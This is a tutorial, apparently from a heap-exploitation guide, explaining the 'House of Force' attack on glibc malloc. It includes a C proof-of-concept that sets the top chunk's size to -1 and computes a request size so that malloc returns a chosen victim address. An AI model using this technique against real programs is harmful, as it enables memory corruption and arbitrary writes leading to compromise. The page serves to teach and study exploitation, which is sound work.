# House of Force

Similar to 'House of Lore', this attack focuses on returning an arbitrary pointer from 'malloc'. Forging chunks attack was discussed for fastbins and the 'House of Lore' attack was discussed for small bins. The 'House of Force' exploits the 'top chunk'. The topmost chunk is also known as the 'wilderness'. It borders the end of the heap (i.e. it is at the maximum address within the heap) and is not present in any bin. It follows the same format of the chunk structure.

This attack assumes an overflow into the top chunk's header. The `size` is modified to a very large value (`-1` in this example). This ensures that all initial requests will be services using the top chunk, instead of relying on `mmap`. On a 64 bit system, `-1` evaluates to `0xFFFFFFFFFFFFFFFF`. A chunk with this size can cover the entire memory space of the program. Let us assume that the attacker wishes 'malloc' to return address `P`. Now, any malloc call with the size of: `&top_chunk` - `P` will be serviced using the top chunk. Note that `P` can be after or before the `top_chunk`. If it is before, the result will be a large positive value (because size is unsigned). It will still be less than `-1`. An integer overflow will occur and malloc will successfully service this request using the top chunk. Now, the top chunk will point to `P` and any future requests will return `P`!

Consider this sample code (download the complete version [here](../assets/files/house_of_force.c)):

```c
// Attacker will force malloc to return this pointer
char victim[] = "This is victim's string that will returned by malloc"; // At 0x601060

struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[10];               // padding
};

struct chunk_structure *chunk, *top_chunk;
unsigned long long *ptr;
size_t requestSize, allotedSize;

// First, request a chunk, so that we can get a pointer to top chunk
ptr = malloc(256);                                                    // At 0x131a010
chunk = (struct chunk_structure *)(ptr - 2);                          // At 0x131a000

// lower three bits of chunk->size are flags
allotedSize = chunk->size & ~(0x1 | 0x2 | 0x4);

// top chunk will be just next to 'ptr'
top_chunk = (struct chunk_structure *)((char *)chunk + allotedSize);  // At 0x131a110

// here, attacker will overflow the 'size' parameter of top chunk
top_chunk->size = -1;       // Maximum size

// Might result in an integer overflow, doesn't matter
requestSize = (size_t)victim            // The target address that malloc should return
                - (size_t)top_chunk     // The present address of the top chunk
                - 2*sizeof(long long)   // Size of 'size' and 'prev_size'
                - sizeof(long long);    // Additional buffer

// This also needs to be forced by the attacker
// This will advance the top_chunk ahead by (requestSize+header+additional buffer)
// Making it point to 'victim'
malloc(requestSize);                                                  // At 0x131a120

// The top chunk again will service the request and return 'victim'
ptr = malloc(100);                                // At 0x601060 !! (Same as 'victim')
```

'malloc' returned an address pointing to `victim`.

Note the following things that we need to take care:

1. While deducing the exact pointer to `top_chunk`, 0 out the three lower bits of the previous chunk to obtain correct size.
2. While calculating requestSize, an additional buffer of around `8` bytes was reduced. This was just to counter the rounding up malloc does while servicing chunks. Incidentally, in this case, malloc returns a chunk with `8` additional bytes than requested. Notice that this is machine dependent.
3. `victim` can be any address (on heap, stack, bss, etc.).
